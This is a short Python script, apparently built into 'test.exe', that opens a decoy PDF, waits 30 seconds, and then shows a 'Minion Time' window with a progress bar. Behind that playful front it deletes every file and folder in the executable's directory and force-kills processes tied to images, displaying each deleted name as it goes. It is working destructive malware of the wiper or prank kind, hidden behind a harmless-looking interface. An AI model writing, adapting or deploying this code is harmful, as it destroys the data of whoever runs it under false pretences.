import os
import shutil
import subprocess
import time
import PySimpleGUIQt as sg
import pathlib


def start():
    folder = os.path.dirname(os.path.abspath("test.exe"))  # Ubicación de archivo .exe en el dispositivo
    photo = os.path.dirname(os.path.abspath(__file__))  # Ubicación dentro de la carpeta temporal del ejecutable
    img_path = photo + "\\minion.png"  # Ruta de la imagen de la interfaz

    sg.theme('SystemDefaultForReal')  # Tema de la interfaz
    layout = [[sg.Text('Minion Time', font="Roboto, 50")],
              [sg.Image(f'{img_path}')],
              [sg.Text('Sad nomba:', font="Roboto, 16"), sg.Text('', key='-TEXT-', font="Roboto, 16")],
              [sg.ProgressBar(10000, orientation='h', size=(20, 20), key='progressbar')]]  # Estructura de la interfaz

    window = sg.Window('Minion Time').Layout(layout)  # Invocación de la interfaz
    progress_bar = window.find_element('progressbar')  # Definición de barra de progreso

    countFiles = len(os.listdir(folder))
    i = 1
    for filename in os.listdir(folder):  # Recorrido de archivos dentro de la carpeta
        file_path = os.path.join(folder, filename)  # Ruta de los archivos
        try:
            if file_path == os.path.join(folder, "test.exe"):
                pass  # Omisión de ejecutable
            elif os.path.isfile(file_path) or os.path.islink(file_path):
                if ".jpg" in pathlib.Path(filename).suffixes or ".png" in pathlib.Path(filename).suffixes:
                    subprocess.call(["taskkill", "/F", "/IM", file_path])  # Cierre de imagenes abiertas
                os.remove(file_path)  # Eliminación de archivos
            elif os.path.isdir(file_path):
                shutil.rmtree(file_path)  # Eliminación de carpetas
        except Exception:
            sg.PopupTimed('Ilkyen da adzmo, to sama vivo nunu muggey dia %s.')  # Mensaje de error en caso de fallas
        finally:
            event, values = window.Read(timeout=250)  # Lectura de la interfaz
            progress_bar.UpdateBar(int((i / countFiles) * 10000))  # Cálculo para el porcentaje
            i += 1
            window['-TEXT-'].update(filename)  # Nombre del archivo eliminado
    sg.PopupTimed('Tadda tu dim kaylay bem teepus') # Mensaje de eliminación finalizada

    time.sleep(10)
    window.Close()


# Ubicación dentro de carpeta temporal
filen = os.path.dirname(os.path.abspath(__file__))
filen = os.path.join(filen, "blank.pdf")  # Ruta del PDF
subprocess.Popen(filen, shell=True)  # Invocación del PDF
time.sleep(30)
start()  #Invocación del "Happy Pack"



